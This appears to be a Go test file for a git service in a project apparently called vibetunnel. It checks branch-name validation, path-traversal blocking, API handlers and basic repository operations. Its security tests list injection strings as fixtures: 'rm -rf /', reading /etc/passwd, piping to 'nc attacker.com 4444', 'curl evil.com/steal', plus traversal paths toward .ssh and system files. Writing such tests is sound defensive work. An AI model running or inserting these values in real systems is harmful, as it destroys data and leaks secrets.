package git

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/gorilla/mux"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// setupTestRepo creates a temporary Git repository for testing
func setupTestRepo(t *testing.T) (string, func()) {
	tempDir, err := os.MkdirTemp("", "vibetunnel_git_test_*")
	require.NoError(t, err)

	// Initialize git repo
	err = runGitCommand(tempDir, "init")
	require.NoError(t, err)

	// Configure user for testing
	err = runGitCommand(tempDir, "config", "user.email", "test@example.com")
	require.NoError(t, err)
	
	err = runGitCommand(tempDir, "config", "user.name", "Test User")
	require.NoError(t, err)

	// Create initial commit
	testFile := filepath.Join(tempDir, "README.md")
	err = os.WriteFile(testFile, []byte("# Test Repository"), 0644)
	require.NoError(t, err)

	err = runGitCommand(tempDir, "add", "README.md")
	require.NoError(t, err)

	err = runGitCommand(tempDir, "commit", "-m", "Initial commit")
	require.NoError(t, err)

	cleanup := func() {
		os.RemoveAll(tempDir)
	}

	return tempDir, cleanup
}

// Test Security: Command Injection Prevention (CRITICAL)
func TestGitService_CommandInjectionPrevention(t *testing.T) {
	repoPath, cleanup := setupTestRepo(t)
	defer cleanup()

	service := NewGitService(repoPath)

	// Test malicious branch names that could execute commands
	maliciousBranches := []string{
		"; rm -rf /",
		"master && rm important.txt",
		"branch`evil_command`", 
		"test; cat /etc/passwd",
		"main|nc attacker.com 4444",
		"feature && curl evil.com/steal",
		"branch'; DROP TABLE users; --",
		"$(whoami)",
		"`id`",
		"branch\nrm -rf /",
		"branch\r\nevil_command",
	}

	for _, maliciousBranch := range maliciousBranches {
		t.Run("checkout_blocks_injection_"+maliciousBranch, func(t *testing.T) {
			err := service.CheckoutBranch(maliciousBranch)
			
			// Should ALWAYS fail with validation error, never execute the command
			require.Error(t, err)
			assert.Contains(t, err.Error(), "invalid")
		})

		t.Run("create_branch_blocks_injection_"+maliciousBranch, func(t *testing.T) {
			err := service.CreateBranch(maliciousBranch)
			
			require.Error(t, err) 
			assert.Contains(t, err.Error(), "invalid")
		})
	}
}

// Test Security: Repository Path Traversal Prevention
func TestGitService_PathTraversalPrevention(t *testing.T) {
	repoPath, cleanup := setupTestRepo(t)
	defer cleanup()

	// Create service with restricted base path
	service := NewGitService(repoPath)

	// Attempt to discover repositories outside allowed path
	maliciousPaths := []string{
		"../../../etc",
		"../../.ssh",
		"/etc/passwd",
		"../../../../../root",
		"..\\..\\windows\\system32", // Windows path traversal
		"../user/.bash_history",
		"../../../../tmp/evil.sh",
	}

	for _, maliciousPath := range maliciousPaths {
		t.Run("discover_blocks_traversal_"+maliciousPath, func(t *testing.T) {
			repos, err := service.DiscoverRepositories(maliciousPath)
			
			// Should either error or return empty results, never access outside base path
			if err != nil {
				// Should get access denied or invalid path error
				assert.True(t, 
					strings.Contains(err.Error(), "invalid") || 
					strings.Contains(err.Error(), "access denied"),
					"Expected 'invalid' or 'access denied' error, got: %s", err.Error())
			} else {
				assert.Empty(t, repos)
			}
		})
	}
}

// Test Security: Input Validation for Git Commands
func TestGitService_InputValidation(t *testing.T) {
	repoPath, cleanup := setupTestRepo(t)
	defer cleanup()

	service := NewGitService(repoPath)

	tests := []struct {
		name        string
		input       string
		operation   string
		expectError bool
		errorMsg    string
	}{
		{
			name:        "valid_branch_name",
			input:       "feature/new-feature",
			operation:   "checkout",
			expectError: false,
		},
		{
			name:        "valid_branch_name_with_numbers",
			input:       "hotfix-123",
			operation:   "checkout", 
			expectError: false,
		},
		{
			name:        "empty_branch_name",
			input:       "",
			operation:   "checkout",
			expectError: true,
			errorMsg:    "empty",
		},
		{
			name:        "whitespace_only",
			input:       "   ",
			operation:   "checkout",
			expectError: true,
			errorMsg:    "invalid",
		},
		{
			name:        "contains_semicolon",
			input:       "test;branch",
			operation:   "checkout",
			expectError: true,
			errorMsg:    "invalid",
		},
		{
			name:        "contains_pipe",
			input:       "test|branch",
			operation:   "checkout", 
			expectError: true,
			errorMsg:    "invalid",
		},
		{
			name:        "contains_ampersand",
			input:       "test&branch",
			operation:   "checkout",
			expectError: true,
			errorMsg:    "invalid",
		},
		{
			name:        "contains_backtick",
			input:       "test`branch",
			operation:   "checkout",
			expectError: true,
			errorMsg:    "invalid",
		},
		{
			name:        "contains_dollar",
			input:       "test$branch",
			operation:   "checkout",
			expectError: true,
			errorMsg:    "invalid",
		},
		{
			name:        "too_long_branch_name",
			input:       strings.Repeat("a", 256), // Very long branch name
			operation:   "checkout",
			expectError: true,
			errorMsg:    "too long",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var err error
			
			switch tt.operation {
			case "checkout":
				err = service.CheckoutBranch(tt.input)
			case "create":
				err = service.CreateBranch(tt.input)
			}

			if tt.expectError {
				require.Error(t, err)
				if tt.errorMsg != "" {
					assert.Contains(t, strings.ToLower(err.Error()), tt.errorMsg)
				}
			} else {
				// For valid branches that don't exist yet, we expect a git error, not validation error
				if err != nil {
					assert.NotContains(t, strings.ToLower(err.Error()), "invalid")
				}
			}
		})
	}
}

// Test Security: Repository Access Control
func TestGitService_RepositoryAccessControl(t *testing.T) {
	repoPath, cleanup := setupTestRepo(t)
	defer cleanup()

	service := NewGitService(repoPath)

	// Test accessing repository outside of allowed base path
	outsideRepo := "/tmp/outside_repo"
	
	status, err := service.GetRepositoryStatus(outsideRepo)
	
	// Should fail with access denied
	require.Error(t, err)
	assert.Contains(t, err.Error(), "access denied")
	assert.Nil(t, status)
}

// Test Basic Functionality: Repository Status
func TestGitService_GetRepositoryStatus(t *testing.T) {
	repoPath, cleanup := setupTestRepo(t)
	defer cleanup()

	service := NewGitService(repoPath)

	status, err := service.GetRepositoryStatus(".")
	
	require.NoError(t, err)
	require.NotNil(t, status)
	
	assert.Equal(t, repoPath, status.RepoPath)
	assert.Equal(t, "master", status.CurrentBranch) // Git default branch
	assert.True(t, status.IsClean)
	assert.Empty(t, status.StagedFiles)
	assert.Empty(t, status.UnstagedFiles)
	assert.Empty(t, status.UntrackedFiles)
}

// Test Basic Functionality: Branch Listing
func TestGitService_ListBranches(t *testing.T) {
	repoPath, cleanup := setupTestRepo(t)
	defer cleanup()

	service := NewGitService(repoPath)

	// Create additional test branch
	err := runGitCommand(repoPath, "checkout", "-b", "test-branch")
	require.NoError(t, err)
	
	// Switch back to master
	err = runGitCommand(repoPath, "checkout", "master")
	require.NoError(t, err)

	branches, err := service.ListBranches()
	
	require.NoError(t, err)
	require.Len(t, branches, 2)
	
	// Should contain both branches
	branchNames := make([]string, len(branches))
	for i, branch := range branches {
		branchNames[i] = branch.Name
	}
	
	assert.Contains(t, branchNames, "master")
	assert.Contains(t, branchNames, "test-branch")
	
	// Master should be current
	for _, branch := range branches {
		if branch.Name == "master" {
			assert.True(t, branch.IsCurrent)
		} else {
			assert.False(t, branch.IsCurrent)
		}
	}
}

// Test Error Handling: Invalid Repository
func TestGitService_InvalidRepository(t *testing.T) {
	// Create non-git directory
	tempDir, err := os.MkdirTemp("", "not_a_git_repo_*")
	require.NoError(t, err)
	defer os.RemoveAll(tempDir)

	service := NewGitService(tempDir)

	status, err := service.GetRepositoryStatus(".")
	
	require.Error(t, err)
	assert.Contains(t, err.Error(), "not a git repository")
	assert.Nil(t, status)
}

// Test API Endpoints: Status Endpoint
func TestGitAPIHandler_GetStatus(t *testing.T) {
	repoPath, cleanup := setupTestRepo(t)
	defer cleanup()

	service := NewGitService(repoPath)
	router := mux.NewRouter()
	service.RegisterRoutes(router)

	req, err := http.NewRequest("GET", "/api/git/status?path=.", nil)
	require.NoError(t, err)

	rr := httptest.NewRecorder()
	router.ServeHTTP(rr, req)

	assert.Equal(t, http.StatusOK, rr.Code)
	
	var status RepositoryStatus
	err = json.Unmarshal(rr.Body.Bytes(), &status)
	require.NoError(t, err)
	
	assert.Equal(t, repoPath, status.RepoPath)
	assert.Equal(t, "master", status.CurrentBranch)
	assert.True(t, status.IsClean)
}

// Test API Endpoints: Branches Endpoint
func TestGitAPIHandler_ListBranches(t *testing.T) {
	repoPath, cleanup := setupTestRepo(t)
	defer cleanup()

	service := NewGitService(repoPath)
	router := mux.NewRouter()
	service.RegisterRoutes(router)

	req, err := http.NewRequest("GET", "/api/git/branches", nil)
	require.NoError(t, err)

	rr := httptest.NewRecorder()
	router.ServeHTTP(rr, req)

	assert.Equal(t, http.StatusOK, rr.Code)
	
	var response BranchListResponse
	err = json.Unmarshal(rr.Body.Bytes(), &response)
	require.NoError(t, err)
	
	assert.NotEmpty(t, response.Branches)
	assert.Contains(t, response.Branches[0].Name, "master")
}

// Test API Security: Malicious Requests
func TestGitAPIHandler_SecurityValidation(t *testing.T) {
	repoPath, cleanup := setupTestRepo(t)
	defer cleanup()

	service := NewGitService(repoPath)
	router := mux.NewRouter()
	service.RegisterRoutes(router)

	maliciousRequests := []struct {
		name     string
		method   string
		url      string
		expected int
	}{
		{
			name:     "path_traversal_in_status",
			method:   "GET", 
			url:      "/api/git/status?path=../../../etc/passwd",
			expected: http.StatusBadRequest,
		},
		{
			name:     "command_injection_in_checkout",
			method:   "POST",
			url:      "/api/git/checkout",
			expected: http.StatusBadRequest,
		},
	}

	for _, tt := range maliciousRequests {
		t.Run(tt.name, func(t *testing.T) {
			var req *http.Request
			var err error
			
			if tt.method == "POST" {
				body := strings.NewReader(`{"branch": "; rm -rf /"}`)
				req, err = http.NewRequest(tt.method, tt.url, body)
				req.Header.Set("Content-Type", "application/json")
			} else {
				req, err = http.NewRequest(tt.method, tt.url, nil)
			}
			
			require.NoError(t, err)

			rr := httptest.NewRecorder()
			router.ServeHTTP(rr, req)

			assert.Equal(t, tt.expected, rr.Code)
		})
	}
}

// Test Repository Discovery with Security
func TestGitService_DiscoverRepositories(t *testing.T) {
	baseDir, err := os.MkdirTemp("", "git_discovery_test_*")
	require.NoError(t, err)
	defer os.RemoveAll(baseDir)

	// Create a few git repositories
	repo1 := filepath.Join(baseDir, "repo1")
	repo2 := filepath.Join(baseDir, "subdir", "repo2")
	
	os.MkdirAll(repo1, 0755)
	os.MkdirAll(repo2, 0755)
	
	// Initialize repos
	err = runGitCommand(repo1, "init")
	require.NoError(t, err)
	
	err = runGitCommand(repo2, "init")
	require.NoError(t, err)

	service := NewGitService(baseDir)

	repos, err := service.DiscoverRepositories(".")
	
	require.NoError(t, err)
	assert.Len(t, repos, 2)
	
	// Should find both repositories
	repoPaths := make([]string, len(repos))
	for i, repo := range repos {
		repoPaths[i] = repo.Path
	}
	
	assert.Contains(t, repoPaths, repo1)
	assert.Contains(t, repoPaths, repo2)
}

// Helper function to run git commands for testing
func runGitCommand(repoPath string, args ...string) error {
	cmd := exec.Command("git", args...)
	cmd.Dir = repoPath
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("git command failed: %v (output: %s)", err, string(output))
	}
	
	return nil
}

// Test Performance: Large Repository Handling
func TestGitService_PerformanceLargeRepo(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping performance test in short mode")
	}

	repoPath, cleanup := setupTestRepo(t)
	defer cleanup()

	service := NewGitService(repoPath)

	// Create many files to simulate large repo
	for i := 0; i < 100; i++ {
		fileName := fmt.Sprintf("file%d.txt", i)
		filePath := filepath.Join(repoPath, fileName)
		err := os.WriteFile(filePath, []byte(fmt.Sprintf("content %d", i)), 0644)
		require.NoError(t, err)
	}

	// Test that status still responds quickly
	status, err := service.GetRepositoryStatus(".")
	
	require.NoError(t, err)
	assert.NotNil(t, status)
	assert.Len(t, status.UntrackedFiles, 100)
}